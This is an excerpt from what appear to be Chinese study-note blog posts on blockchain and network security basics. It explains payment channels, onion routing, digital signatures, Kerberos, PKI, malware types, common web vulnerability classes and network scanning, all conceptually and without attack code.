闪电网络：这是为达到链下通道隔离机制所使用的一种技术，主要目的是解决区块链上高频小额支付不便问题。其网络运行主体在区块链链下，实现了高频小额交易的同时，还提高了用户交易隐私安全性，对整个区块链技术来说，其拓展性有一步增强。\n洋葱网络是一种在计算机网络上进行匿名通信的技术。通信数据先进行多层加密然后在由若干个被称为洋葱路由器组成的通信线路上被传送。每个洋葱路由器去掉一个加密层，以此得到下一条路由信息，然后将数据继续发往下一个洋葱路由器，不断重复，直到数据到达目的地。这就防止了那些知道数据发送端以及接收端的中间人窃得数据内容。\n大蒜路由（Garlic routing）是洋葱路由的一个变体，它将传输的原始数据拆散为加密数据包通过多条隧道交叉疏散传递，令攻击者的流量分析难上加难。在洋葱路由中一条或多条数据流的上传与下载共用一条隧道，而这种路由方式的上传与下载隧道相互独立而且两个方向上的隧道数量都可能&gt;1，所以被称为大蒜路由。令攻击者的流量分析难上加难。\n闪电网络为解决比特币拥堵而生，当然也可以用于其他区块链项目，比如我们上篇说的OMG。不过，以太坊也有自己的“闪电网络”，它的名字叫雷电网络。甚至，以太坊除了雷电网络，还有其他类似的技术。我们可以把闪电网络、雷电网络及其他类似技术，统称为“状态通道技术”。\n我们回顾下闪电网络的原理就知道，双方构建一条通道，然后双方的状态（在比特币里，仅为账户余额）在通道里刷新，通道关闭后，再将最终状态记录到区块链上。所以，状态通道这个名字还是挺贴切的。从这里可以看出，所有的状态通道技术，仅仅是把区块链当做最后的记录手段，而在平时尽量避免“上链”。\n继闪电网络后，今天我们稍微来了解下以太坊的雷电网络。\n在比特币那里，闪电网络只是一个单纯的技术，但以太坊的雷电网络是一个有自己代币（RDN）的ICO项目。从技术上来说，发不发代币并无区别，所以V神也曾质疑过RDN的必要性。不过从通证经济的角度来看，也许有妙用。不过，咱们这里仅了解其技术。\n因为以太坊是一个图灵完备的智能合约平台，很多复杂的工作以太坊在底层就已完成了，所以雷电网络的实现其实比闪电网络更简单。雷电网络不像闪电网络，必须依赖多重签名地址予以实现，而是直接靠以太坊的智能合约来实现：\n第一步：在以太坊上布署一个智能合约，理论上来说，既可以每建一个通道，就布署一个合约，也可以为一种代币布署一个合约。前者实现比较简单，但耗费gas太多，后者实现起来复杂一点，但便宜一些。\n第二步：通道双方将一定量的代币发送到合约地址进行锁定，构建资金池，在闪电网络那，由多重签名地址代持代币，而在雷电网络，则由合约地址代持。同时，双方会向合约发送一条双方签名的报文，这条报文的作用是向全网公示，通道双方各自锁定了多少代币。到此时为止，通道便建立起来了。\n第三步：通道建立后，双方所有的交易都可以在链下进行。举个例子：比如A和B建立了雷电通道，双方最初各自锁定了10个以太币，现在A要转1个以太币给B，那么双方一起签名一条新的信息：A减去1个以太币，B增加1个以太币（闪电通道的是记录余额，雷电通道的是记录净增减，比如A再发1个以太币给B，闪电通道会记录A还有8个，B有12个，但雷电通道会记录A减少2个，B增加2个）。这条信息不需要发到区块链上，只需A和B保留就行。\n第四步：A和B之间在链下的每一次双方签名的转账信息，都有一个序列号，比如第一次是1，第二次是2，如果要结束通道（假如A发起 ），A可以将最新的，也就是序列号最大的那个信息发送到智能合约，同时提供一个锁定时间。如果在锁定时间到期前，B提供了一个更新的信息，那说明A作弊（比如，A在倒数第二条信息时收到了B的1个以太币，在最后一条信息发给B两个以太币，但A结束通道时，只提交倒数第二条信息），合约会将锁定的币全部给B，用以惩罚A，如果到期时对方没有异议，合约根据最后这条信息的净增减额计算双方的最终余额并发还给他们。\n应用隐私​    应用隐私一般分为用户端隐私与服务端隐私，隐私主要内容有支付流敏感信息、浏览器 Cookie、密钥存放位置等。\n​\t这一类隐私信息的泄露威胁其实并不来源于区块链技术本身，其主要问题还是在用户和服务商身上。用户的安全意识薄弱，在系统全线申请的时候往往会采用默认同意授权的方式。这样就给了第三方攻击者的操作空间，在对用户敏感信息进行收集之后，就可以通过一系列技术跟用户的身份产生映射关系，这样就能联系到用户的其他信息，造成严重的隐私泄露。而在攻击者收集信息之前，用户往往很难注意到自己暴露的哪些信息隐含着自己的敏感隐私，更不知道这些信息会被攻击者利用起来使自己的隐私信息全部暴露。\n​    服务商暴露隐私的源头主要来自操作不当或者服务漏洞。就比如服务商授予用户的权限不匹配、服务商公开信息中隐含了敏感信息、插件存在漏洞等。对于这类隐私威胁，常用的解决方案有发布官方插件、身份认证、增强用户安全意识等。\n为了有效保护用户端隐私和服务端隐私，可以采取以下一些措施：\n   加密通信：确保用户端和服务端之间的通信是加密的，使用SSL&#x2F;TLS等协议来保护数据传输的隐私。\n   隐私政策和协议：制定并明确公布隐私政策和服务协议，告知用户个人数据的收集、使用、存储、共享和保护方式，以及用户的权利和选择。\n   匿名化处理：尽可能对用户端数据进行匿名化处理，避免直接暴露用户的身份信息。\n数据加密：对敏感数据进行加密存储，确保只有授权人员可以解密访问。\n​    访问控制：限制对用户端和服务端数据的访问权限，只允许有必要的人员能够访问和处理相关数据。\n   安全审计：对系统和数据进行定期安全审计，及时发现潜在的风险和漏洞。\n更新维护：定期更新系统和应用程序，修复已知漏洞，以确保系统的最新安全性。\n   数据备份与恢复：建立定期数据备份和灾难恢复机制，确保数据不会因故意破坏、意外删除或硬件故障而永久丢失。\n","url":"2024/11/26/链安3/","date":"2024-11-26"},{"title":"区块链安全基础二","content":"四.数字签名与认证技术消息摘要算法：消息摘要是保证明文无法篡改、完整性的一种算法，消息摘要不是加密明文，也不是加密算法\n\n无论输入的消息有多长，计算出来的消息摘要的长度总是固定的。\n消息摘要看起来是“随机的”。\n一般地，只要输入的消息不同，对其进行摘要以后产生的摘要消息也必不相同\n消息摘要函数是无陷门的单向函数，即只能进行正向的消息摘要而无法从摘要中恢复出任何的消息\n好的摘要算法，没有人能从中找到“碰撞”，虽然“碰撞”是肯定存在的。\n\nHash函数：Hash函数特点：（令h表示哈希函数，h满足以下条件）\n 输入可以是任意长度的消息或文件M；\n 输出长度是固定的；\n 给定h和M，计算h(M)是容易的；\n 给定h的描述，找两个不同的消息M1和M2，使得h(M1)&#x3D;h(M2)在计算上是不可行的。 \nHash函数的安全性：在现有的计算资源下，找到一个碰撞是不可能的。\nHash函数在网络安全应用中，不仅能用于保护消息或文件的完整性，而且也能用作密码信息的安全存储。\n主要Hash算法有MD2、MD4、MD5、SHA。\n其中，MD5能产生128比特长度的哈希值，它的使用广泛，常用于网络中文件的完整性检查。而SHA在美国政府中使用，作为安全哈希标准，SHA产生的哈希值比MD5长，有160比特。 \n数字签名：数字签名(Digital Signature)是手写签名的电子模拟，是通过电子信息计算处理，产生的一段特殊字符串消息，该消息具有与手写签名一样的特点，是可信的、不可伪造的、不可重用的、不可抵赖的以及不可修改的。\n数字签名至少应满足以下三个条件：\n　　n 签名者事后不能否认自己的签名；\n　　n 接收者能验证签名，而任何其他人都不能伪造签名；\n　　n当双方就签名的真伪发生争执时，第三方能解决双方之间发生的争执。\n分类：（1）直接方式的数字签名\n​\t\t  直接方式的数字签名只有通信双方参与，并假定接收一方知道发方的公钥。数字签名的形成方式可以用发方的私钥加密信息。 \n  直接方式的数字签名有一公共弱点，即方案的有效性取决于发方密钥的安全性。 \n（2）具有仲裁方式的数字签名\n​\t\t发方A对发往收方B的信息签名后，将信息及其签名先发给仲裁者C，C对信息及其签名验证完成后，再连同一个表示已通过验证的指令一起发往收方B。此时由于C的存在，A无法对自己发出的信息予以否认\n特点&amp;组成：一个数字签名方案一般由签名算法和验证算法组成。签名算法的密钥是秘密的，只有签名人掌握；而验证算法则是公开的，以便他人验证。\n签名与加密很相似，一般是签名者利用秘密密钥(私钥)对需签名的数据进行加密，验证方利用签名者的公开密钥(公钥)对签名数据做解密运算。签名与加密的不同之处在于，加密的目的是保护信息不被非授权用户访问，而签名的目的是让消息接收者确信信息的发送者是谁，信息是否被他人篡改。\n数字签名基本流程：（熟悉的Alice和Bob又出现了）\n假设Alice需要签名发送一份电子合同文件给Bob。Alice的签名步骤如下： \n\n　　第一步，Alice使用Hash函数将电子合同文件生成一个消息摘要。\n\n　　第二步，Alice使用自己的私钥，把消息摘要加密，形成一个数字签名。\n\n　　第三步，Alice把电子合同文件和数字签名一同发送给Bob。\n Bob收到Alice发送的电子合同文件及数字签名后，要验证电子合同文件是Alice所认可的，验证步骤如下：\n\n​    第一步，Bob使用与Alice相同的Hash算法，计算出所收到电子合同文件的消息摘要。\n\n　第二步，Bob使用Alice的公钥，解密来自Alice的加密消息摘要，恢复出Alice原来的消息摘要。\n\n　第三步，Bob比较自己产生的消息摘要和恢复出来的消息摘要之间的异同。若两个消息摘要相同，则表明电子合同文件来自Alice。如果两个消息摘要的比较结果不一致，则表明电子合同文件已被篡改。\n\n\n\n数字证书（数字标识）：\n提供了一种在网络上身份验证的方式，是用来标志和证明网络通信双方身份的数字信息文件，与司机驾照或日常生活中的身份证相似。\n\n由权威公正的第三方机构即CA中心签发。\n\n以数字证书为核心的加密技术可以对网络上传输的信息进行加密和解密、数字签名和签名验证，确保网上传递信息的机密性、完整性，以及交易实体身份的真实性，签名信息的不可否认性，从而保障网络应用的安全性。\n\n采用公钥密码体制，即利用一对互相匹配的密钥进行加密、解密。通过数字的手段保证加密过程是一个不可逆过程，即只有用私钥才能解密。\n\n使用：当发送一份保密文件时，发送方使用接收方的公钥对数据加密，而接收方则使用自己的私钥解密\n\n数字证书能够确认以下两点：\n  ①保证信息是由签名者自己签名发送的，签名者不能否认或难以否认。\n  ②保证信息自签发后到收到为止未曾作过任何修改，签发的文件是真实文件。\n\n\n认证及认证模型：认证（Authentication）是指核实真实身份的过程，是防止主动攻击的重要技术之一。计算机只能识别用户的数字身份，所有对用户的授权也是针对用户数字身份的授权。\n认证的用途主要用途有三方面：\n（1）验证网络资源访问者的身份，给网络系统访问授权提供支持服务。\n（2）验证网络信息的发送者和接收者的真实性，防止假冒。\n（3）验证网络信息的完整性，防止篡改、重放或延迟。\n认证信息类型常用的鉴别信息主要有四种：\n（1）所知道的秘密，如用户口令、PIN (Personal Identification Number)。\n（2）所拥有的实物，一般是不可伪造的设备，如智能卡、磁卡等。\n（3）生物特征信息，如指纹、声音、视网膜等。\n（4）上下文信息，就是认证实体所处的环境信息、地理位置、时间等，例如IP地址等。 \n认证方法分类\n单向认证\n\n 单向认证是指在网络服务认证过程中，服务方对客户方进行单方面的鉴别，而客户方不需要识别服务方的身份（账号密码）。\n认证过程：\n第一步，客户方向服务器发出访问请求； \n第二步，服务器要求客户方输入ID；\n第三步，客户方向服务器输入ID；\n第四步，服务器要求客户方输入密码；\n第五步，客户方向服务器输入密码；\n第六步，服务器验证ID和密码，如果匹配则允许客户进入系统访问。 \n\n双向认证双向认证是指在网络服务认证过程中，不仅服务方对客户方要进行鉴别，而且客户方也要鉴别服务方的身份。\n\n认证过程：\n一到六步与单向的过程相同\n第七步，客户提示服务器输入密码；\n第八步，服务器按客户要求输入密码；\n第九步，客户验证服务器。\n\n三方来实现。\n第三方不仅负责维护认证信息，而且还负责验证双方的身份。每个用户都把自己的ID和密码发送给可信第三方，由第三方负责认证过程。此方法兼顾了安全性和密码存储的简单易行性。\n\n\n认证实现技术：\n静态密码: 用户的密码是由用户自己设定的(就是我们平时那个密码)\n\n智能卡（IC卡）：一种内置集成电路的芯片，芯片中存有与用户身份相关的数据\n\n短信密码：手机短信形式请求包含6位随机数的动态密码（安全、普及、易收费和维护）\n\n动态口令牌：生成动态密码的终端\n\nUSB KEY：软硬件相结合、一次一密的强双因子认证模式\n\n数字签名：数字签名又称电子加密，可以区分真实数据与伪造、被篡改过的数据\n\n生物识别技术：通过可测量的身体或行为等生物特征进行身份认证的一种技术\n\n\n （身体特征包括：指纹、掌型、视网膜、虹膜、人体气味、脸型、手的血管和DNA等；）\n （行为特征包括：签名、语音、行走步态等）\n\n双因素身份认证：两种认证方法结合\n\n身份的零知识证明：能够不传输这些信息身份进行认证的方法\n\n\n（ps: 目前部分学者将视网膜识别、虹膜识别和指纹识别等归为高级生物识别技术；将掌型识别、脸型识别、语音识别和签名识别等归为次级生物识别技术；将血管纹理识别、人体气味识别、DNA识别等归为“深奥的”生物识别技术）\nKerberos技术Kerberos的基本原理是利用对称密码技术，使用可信的第三方（刚刚的第三个方法）来认证服务器的用户身份，并在用户和服务器之间建立安全信道。(就是基于对称密码技术在网络上实施认证的一种服务协议，它允许一台工作站通过交换加密消息在非安全网络上与另一台工作站相互证明身份，一旦试图登录上网的用户身份得到验证，Kerberos协议就会给这两台工作站提供密钥，并通过使用密钥和加密算法为用户间的通信加密以进行安全的通信)\nKerberos系统涉及到\n四个基本实体：\n　　Kerberos客户机：用户用来访问服务器的设备。\n　　AS(Authentication Server)：为用户分发TGT(Ticket Granting Ticket)的服务器。用户使用TGT(Ticket Granting Ticket)向TGS(Ticket Granting Server)证明自己的身份。\n　　TGS(Ticket Granting Server)：为用户分发到最终目的票据的服务器，用户使用这个票据向自己要求提供服务的服务器证明自己的身份。\n　　应用服务器(Application Server)：为用户提供特定服务。\n\n设计基本思路：①使用一个（或一组）独立的认证服务器（AS—Authentication Server），来为网络中的客户提供\t身份认证服务；\n②**认证服务器 (AS)**，用户口令由 AS 保存在数据库中；\n③AS 与每个服务器共享一个唯一的保密密钥（已被安全分发）\n\n设计目标：①安全性：能够有效防止攻击者假扮成另一个合法的授权用户。\n②可靠性：分布式服务器体系结构，提供相互备份。\n③对用户透明性\n④可伸缩：能够支持大数量的客户和服务器。\n在实际使用中，会遇到如下问题：\n①用户希望输入口令的次数最少。\n②口令以明文传送会被窃听。\n对于这样的问题，Kerberos的解决办法是：\n ①票据重用（ticket reusable）。\n ②引入票据许可服务器（TGS - ticket-granting server）。用于向用户分发服务器的访问票据；认证服务器 AS 并不直接向客户发放访问应用服务器的票据，而是由 TGS 服务器来向客户发放。\n票据：在Kerberos系统中，票据(Ticket)是用于安全传递用户身份所需要的信息的集合。它不仅包含该用户的身份，而且还包含其他一些相关的信息。一般来说，它主要包括客户方Principal、目的服务方Principal、客户方IP地址、时间戳(分发该Ticket的时间)、Ticket的生存期以及会话密钥等内容。通常将AS和TGS统称为KDC(Key Distribution Center)。\n\n\n工作流程：\n第一步，Kerberos客户向认证服务器AS申请票据TGT。\n第二步，（AS在认证数据库检查、确认Kerberos客户，并产生一个会话密钥，同时使用Kerberos客户的秘密密钥对会话密钥进行加密，然后）生成一个票据TGT，AS生成TGT后，把TGT发送给Kerberos客户\n第三步，（Kerberos客户收到AS 发来的TGT后，使用自己的秘密密钥进行）解密，得到会话密钥，然后利用解密的信息重新构造认证请求单，向TGS发送请求，申请访问应用服务器AP所需要的票据(Ticket)。\n第四步， TGS使用其秘密密钥对TGT进行解密，同时使用TGT中的会话密钥对Kerberos客户的请求认证单信息进行解密，并将解密后的认证单信息与TGT中的信息进行比较。然后，TGS生成新的会话密钥以供Kerberos客户和应用服务器使用，并利用各自的秘密密钥加密会话密钥。最后，生成一个票据，它由Kerberos客户实体名、地址、时间戳、限制时间、会话密钥组成。TGS生成TGT完毕后，把TGT发送给Kerberos客户。\n第五步，Kerberos客户收到TGS的响应后，将获得与应用服务器共享的会话密钥。与此同时，Kerberos客户生成一个新的用于访问应用服务器的认证单，并用与应用服务器共享的会话密钥加密，然后与TGS发送来的票据一并传送到应用服务器。\n第六步，应用服务器确认请求。\n\n优缺点：\n主要优点是利用相对便宜的技术提供了较好的保护水平\n缺点主要体现在以下3个方面：\n  ① 需要具有很高利用率的可信在线认证服务器（至少在物理上是安全的）；\n  ②重放检测依赖于时间戳，这意味着需要同步和安全的时钟；\n  ③ 如果认证过程中的密钥受到威胁，那么传输在使用该密钥进行认证的任何会话过程中的所有被保护的数据都将受到威胁。\n五.PKI 技术基本概念和作用：所谓PKI(Pubic Key Infrastructure)即公钥基础设施，支持公钥的管理，并提供保密性、完整性、真实性以及可追究性安全服务的具有普适性的安全基础设施\n\n可提供安全服务\n支持公钥的管理\n利用公钥和其他加密技术的结合。\n\n主要研究内容及主要服务\n其在计算机和网络环境中得到了广泛应用：如可信计算机的本机认证、网上证券、网上保险；网上办公、网上税务、网上工商、网上海关、网上医院等。\n\n主要研究内容：\nPKI提供公钥加密和数字签名服务的系统或平台，目的是为了管理密钥和证书。通过数字证书，PKI很好的证明了公钥属于谁。\n\n技术的研究对象包括：数字证书，颁发数字证书的证书认证中心（CA），持有证书的证书持有者和使用证书服务的证书用户等\n\n\n主要安全服务：1.认证——向一个实体确认另一个实体确实是他自己。\n2.完整性—— 向一个实体确保数据没有被有意或无意的修改。\n3.机密性——向一个实体确保除了接收者，无人能读懂数据的关键部分。\n4.不可否认性——通过数字签名机制来提供该服务的。\npkl的基本结构PKI体系结构一般由认证机构和各种终端实体组成（pkl体系建立首先应该关注用户使用证书及相关服务的全面性和便利性）\n建立和设计一个PKI体系必须保证\n相关服务功能的实现• 用户身份的可信认证• 制定完整的证书管理政策• 建立高可信度的认证CA中心• 用户实体属性的管理• 用户身份的隐私保护• 证书作废列表处理• 认证机构CA为用户提供证书库及CRL服务的管理\n组成\nPkl策略\n软硬件系统\n证书机构ca\n注册机构ca\n证书发布系统\npkl应用\n\npkl与数字证书数字证书是PKI最基本的元素，也是承载PKI安全服务的最重要的载体。 在PKI体系中,用户就是通过使用数字证书来保障信息的传输的保密性、发送信息的不可否认性、交易者身份的确定性等安全特性。 数字证书是PKI的核心元素，由权威的、可信认的、公证的第三方机构CA所签发\n数字证书的补充用户证书具有下列形式:正在载入… CA《A》&#x3D;CA{V，SN，AI，CA，UCA，A，UA，Ap，TA}这里:V——证书版本号。SN一—证书序列号。AI——用于对证书进行签名的算法的标识符。UCA——CA可选的惟一标识符。UA——用户A可选的唯一标识符。\n数字证书&#x2F;密钥的生命周期主要三个阶段：\n\n证书初始化注册阶段\n颁发投入工作阶段\n撤消阶段\n\n\n认证过程\n证书拆封\n\n用于验证发行者ca的公钥能否正确解开客户实体——证书中的“发行者的数字签名”【即证明该证书是否为可信任的第三方ca机构所签发】2. 序列号验证检查实体证书中的签名实体序列号是否与签发者证书的序列号一致，从而验证证书真伪。3. 有效期验证检查用户证书使用的日期是否合法，有无过期。4.撤销列表查询\npkl互联pkl互通性必须建立在网络互通的基础上\nPKI在全球互通可以有两种实现途径:● 各PKI体系的根CA交叉认证。（一般实现方式）● 建立一个全球性的统一根CA，为各PKI体系的根证书颁发证书。（实现较困难）\n交叉互联双子树结构\npkl应用实例虚拟专用网络（VPN）定义  架构VPN的基础：基于pkl技术的IPSec协议  是一种架构在公用通信基础设 施上的专用数据通信网络，利用网络层安全协议(尤其是IPSec)和建立在PKI上 的加密与签名技术来获得私有性。  口令  用来防止未授权的个人直接访问敏感数据  防火墙  用来防止公司以外的未授权个人访问公司内部信息\n  基于PKI技术的IPSec协议现在已经成为架构VPN 的基础，它可以为路由器之 间、防火墙之间或者路由器和防火墙之间提供经过加密和认证的通信。虽然它的 实现会复杂一些，但其安全性比其他协议都完善得多。由于IPSec是IP层上的协 议，因此很容易在全世界范围内形成一种规范，具有非常好的通用性，而且IPSec本身就支持面向未来的协议——IPv6。\n安全电子邮件—— PKI 与S&#x2F;MIME利用数字证书和私钥，用户可以对他所发的邮件进行数字签名，这样就可以获得认证、完整性和不可否认性，如果证书是由其所属公司或某一可信第三方颁发的，收到邮件的人就可以信任该邮件的来源，无论他是否认识发邮件的人；另一方面，在政策和法律允许的情况下，用加密的方法就可以保障信息的保密性。\n目前发展很快的安全电子邮件协议是S&#x2F;MIME ，是允许发送加密和有签名邮件的协议。主要依赖技术是pkl。\nWeb安全——PKI 与 SSL无论是IE还是其他浏览器，都支持SSL协议（The Secure Sockets Layer）。这是一个在传输层和应用层之间的安全通信层，在两个实体进行通信之前，先要建立SSL连接，以此实现对应用层透明的安全通信。利用PKI技术，服务器和客户端都对对方的证书进行验证，同时客户端生成会话密钥和选择消息摘要算法，利用服务器端的公钥加密会话密钥，传送给服务器，这样SSL协议就允许在浏览器和服务器之间进行加密通信。SSL利用数字证书保证通信安全，服务器端和浏览器端分别由可信的第三方颁发数字证书，这样在交易时，双方可以通过数字证书确认对方的身份。需要注意的是，SSL协议本身并不能提供对不可否认性的支持，这部分的工作必须由数字证书完成。\n结合SSL协议和数字证书，PKI技术可以保证Web 交易多方面的安全需求，使Web上的交易和面对面的交易一样安全。\n第六章 网络攻击与防御技术6.1 攻击技术6.1.1 计算机病毒（或称恶意代码）•计算机病毒是一种恶意软件，可以通过感染计算机系统并在其中复制自身来破坏计算机系统、窃取信息或进行其他恶意活动。\n•计算机病毒通常通过网络、移动存储设备或恶意软件等途径传播，并且可能造成广泛的破坏和损失。\n计算机病毒根据其传播方式、破坏方式和功能等不同特点，可以分为以下几类主要的分类：\n\n文件感染型病毒：病毒会感染可执行文件、程序或脚本文件，一旦这些文件运行，病毒就会开始感染系统中的其他文件\n引导型病毒： 感染计算机的引导扇区后，在计算机启动时加载自身到内存中，使得计算机在启动时被感染\n宏病毒：这种病毒主要利用应用程序中的宏功能，感染文档和模板文件，并在用户打开这些文件时执行恶意代码。\n逻辑炸弹（Logic bombs）：逻辑炸弹是一种预设条件触发的恶意代码，可能在特定条件满足时触发破坏性行为。\n蠕虫（Worm）：蠕虫是一种自我复制并通过网络传播的病毒，可以迅速在网络中传播并感染大量系统。\n特洛伊木马（Trojan horse）：特洛伊木马是一种伪装成正常或有用程序，但实际上含有恶意代码的病毒，常常用于窃取信息、监视用户活动等恶意行为。\nRootkit：Rootkit是植入系统内核或应用程序中的一种恶意软件，目的是隐藏自身活动，绕过系统安全控制。\n勒索软件（Ransomware）：勒索软件是一种加密文件然后勒索用户赎金的恶意软件，对用户和组织造成巨大损失。\n\n（遇到了再查解释。。）\n计算机病毒发展趋势：\n\nAI和机器学习：恶意软件作者开始利用人工智能和机器学习技术来创建更具破坏性和隐匿性的病毒。这些病毒可能能够自我学习和适应防御系统的智能对抗。\n\n指向性攻击：针对特定目标的高度定制化攻击越来越常见，这种攻击可能采用高级持续性威胁（Advanced Persistent Threat，APT）的形式，目的是窃取高价值信息或进行网络间谍活动。\n\nIoT和移动设备攻击：随着物联网设备和移动设备的普及，计算机病毒也开始针对这些设备进行攻击，利用它们的弱点来入侵和控制目标系统。\n\n加密货币挖矿病毒：近年来，加密货币挖矿病毒成为较为普遍的一种类型，这种病毒会利用感染的计算机资源来挖掘加密货币，占用系统性能和资源。\n\n社交工程和钓鱼攻击：计算机病毒作者通过社交工程手段，如伪装成合法的电子邮件或网站，诱导用户点击链接或下载附件，从而传播恶意软件。\n\n\n网络攻击一般采用三种技术手段，\n\n一是利用计算机病毒（或称恶意代码）；\n二是利用系统或者程序中的漏洞，或者协议漏洞；\n三是利用社会工程学。\n\n6.1.2 漏洞的基本概念•漏洞（Vulnerability）是指计算机系统或软件中存在的未被发现或未被修复的安全弱点，可以被黑客或恶意用户利用来进行攻击或入侵。漏洞可能导致系统崩溃、数据泄露、远程执行命令等安全问题，对系统和用户的信息安全构成威胁。许多安全漏洞是程序错误导致的，此时可叫做安全缺陷（Security bug），但并不是所有的安全隐患都是程序安全缺陷导致的。\n系统漏洞\n系统漏洞中目前最常见的是Web漏洞，它通常是指网络系统程序上的漏洞，可能是由于代码编写者在编写代码时考虑不周全等原因而造成的漏洞，常见的Web漏洞有Sql注入、XSS漏洞、上传漏洞等，具体分类如下：\n•1. XSS（Cross-Site Scripting）跨站脚本，因为缩写和CSS重叠，所以只能叫XSS。跨站脚本是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种。\n•2. SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数代入数据库查询，攻击者可以通过在不同的SQL语句来实现对数据库的任意操作。\n•3. CSRF（Cross-Site Request Forgery）为跨站请求伪造，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。CSRF通过伪装成受信任用户请求受信任的网站。CSRF难以防范，危险性比XSS更高。\n•4. SSRF（Server-Side Request Forgery）为服务器端请求伪造，是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统。\n•5. 文件上传漏洞是在上传文件时，如果服务器代码未对客户端上传的文件进行严格的验证和过滤，很容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp等格式的文件）。非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被成为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。\n•6. 命令执行应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令。当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。\n•7. 逻辑漏洞就是指攻击者利用业务的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能处。其中越权访问又分为水平越权和垂直越权。\n6.1.3 社会工程学社会工程学（攻击）是指在信息安全方面操纵人的心理，使其采取行动或泄露机密信息。有别于社会科学中的社会工程，这是种以收集信息、欺诈或入侵系统为目的的信任骗局，已发展出各种技术手段，并可能用于犯罪。\n各类型的网络犯罪和信息安全威胁，都会用社会工程学学的技巧，尤其是在目标式攻击中使用的频率愈来愈高。网络罪犯以往只会用世界杯足球赛或情人节等标题耸动的全球事件或新闻来引诱用户，现在有其他的犯罪手法往往也搭配使用社会工程学学技巧。\n•钓鱼攻击：是一种企图从电子通信中，伪装成信誉卓著的法人媒体以获得用户名、密码和信用卡信息等敏感个人资料的犯罪诈骗过程。大多数的钓鱼攻击都是伪装成银行、学校、软件公司或政府安全机构等可信服务提供者，例如FBI。\n•诱饵计划：在此类型的社会工程学阴谋中，攻击者利用了人们对于例如最新电影或者热门MV的超高关注，从而对这些人进行信息挖掘。这在例如Bit torrent等P2P分享网络中很常见。\n•垃圾邮件：以电子邮件包装着恶意木马程序的电子邮件入侵受害者电脑，例如主旨为美国总统大选结果的电子邮件附件却包含恶意木马程序。\n•电脑蠕虫：不需附在别的程序内，用户不介入操作的情况下也能自我复制或执行。\n•恶意软件。\n6.2 信息收集6.2.1 扫描技术扫描的目的\n主要有三个:\n\n查看目标网络中哪些主机是存活的\n查看存活的主机运行了哪些服务\n查看主机提供的服务有无漏洞\n\n扫描的主要分类：\nIP扫描\n\n​\tIP扫描又叫Ping扫描，主要是通过使用系统自带工具Ping完成的\n（基于ICMP协议，其主要思想就是构造一个ICMP包，发送给目的主机，从目的主机生成的响应来进行判断目标主机是否存活）\nNmap\nNmap是一个网络连接端口扫描软件，用来扫描目标网络主机的网络连接端口。确定哪些服务正在哪些端口上运行，从此推断运行在目标主机上的操作系统类型。它能很容易并相对较快的对目标地址空间进行ICMP Ping扫描。\nNmap的官方网址为https://nmap.org/\n\n端口扫描\n\n​\t端口扫描可以分为TCP扫描和UDP扫描\n​\t1. TCP端口扫描即三次握手\n\n​\t1.第一次握手：客户端向服务器发送报文段1，其中的 SYN 标志位 (前文已经介绍过各种标志位的作用)的值为 1，表示这是一个用于请求发起连接的报文段，其中的序号字段 (Sequence Number，图中简写为seq)被设置为初始序号x (Initial Sequence Number，ISN)，TCP 连接双方均可随机选择初始序号。发送完报文段1之后，客户端进入 SYN-SENT 状态，等待服务器的确认。\n2.第二次握手：服务器在收到客户端的连接请求后，向客户端发送报文段2作为应答，其中 ACK 标志位设置为 1，表示对客户端做出应答，其确认序号字段 (Acknowledgment Number，图中简写为小写 ack) 生效，该字段值为 x + 1，也就是从客户端收到的报文段的序号加一，代表服务器期望下次收到客户端的数据的序号。此外，报文段2的 SYN 标志位也设置为1，代表这同时也是一个用于发起连接的报文段，序号 seq 设置为服务器初始序号y。发送完报文段2后，服务器进入 SYN-RECEIVED 状态。\n3.第三次握手：客户端在收到报文段2后，向服务器发送报文段3，其 ACK 标志位为1，代表对服务器做出应答，确认序号字段 ack 为 y + 1，序号字段 seq 为 x + 1。此报文段发送完毕后，双方都进入 ESTABLISHED 状态，表示连接已建立。\n•第一步：客户端进程发出断开连接指令，这将导致客户端的TCP程序创建一个特殊的TCP报文段，发送到服务器。这个报文段的FIN字段被置为1，表示这是一条断开连接的报文；\n•第二步：服务器接收到客户端发来的断开连接报文，向客户端回送这个报文的确认报文（ACK字段为1），告诉服务器已经接收到FIN报文，并允许断开连接；\n•第三步：服务器发送完确认报文后，服务器的TCP程序创建一条自己的断开连接报文，此报文的FIN字段被置为1，然后发往客户端；\n•第四步：客户端接收到服务器发来的FIN报文段，则产生一条确认报文（ACK为1），发送给服务器，告知服务器已经接收到了它的断开报文。服务器接收到这条ACK报文段后，释放TCP连接相关的资源（缓存和变量），而客户端等待一段时间后（半分钟、一分钟或两分钟），也释放处于客户端的缓存和变量；\n•ACK：只有1 bit的标志位，若为1，表示这个数据段中的确认序号是有效的，即这个数据报是对之前接收到的某个报文的确认（一个TCP报文可以同时作为确认报文和传递数据报文）。\n•RST：只有1 bit的标志位，若客户端向服务器的一个端口请求建立TCP连接，但是服务器的那个端口并不允许建立连接（比如没开启此端口），则服务器会回送一个TCP报文，将RST位置为1，告诉客户端不要再向这个端口发起连接；\n•SYN：只有1 bit的标志位，若为1，表示这是一条建立连接的TCP报文段；\n•FIN：只有1 bit的标志位，若为1，表示这是一条断开连接的TCP报文段；\nUDP扫描\n\nUDP扫描发送空的(没有数据)UDP报头到每个目标端口。 如果返回ICMP端口不可到达错误(类型3，代码3)， 该端口是closed(关闭的)。 其它ICMP不可到达错误(类型3， 代码1，2，9，10，或者13)表明该端口是filtered(被过滤的)。 偶尔地，某服务会响应一个UDP报文，证明该端口是open(开放的)。 如果几次重试后还没有响应，该端口就被认为是 open|filtered(开放|被过滤的)。 这意味着该端口可能是开放的，也可能包过滤器正在封锁通信。 